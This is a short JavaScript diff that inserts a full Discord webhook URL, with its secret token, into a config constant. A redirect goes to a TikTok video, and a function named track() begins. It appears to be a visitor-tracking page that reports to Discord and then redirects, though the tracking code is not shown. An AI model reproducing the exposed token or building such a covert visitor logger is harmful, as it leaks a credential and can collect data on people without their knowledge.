@@ -1,4 +1,4 @@
-const WEBHOOK_URL = ""; // ここにWebhook URLを貼る
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; // ここにWebhook URLを貼る
 const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";
 
 async function track() {
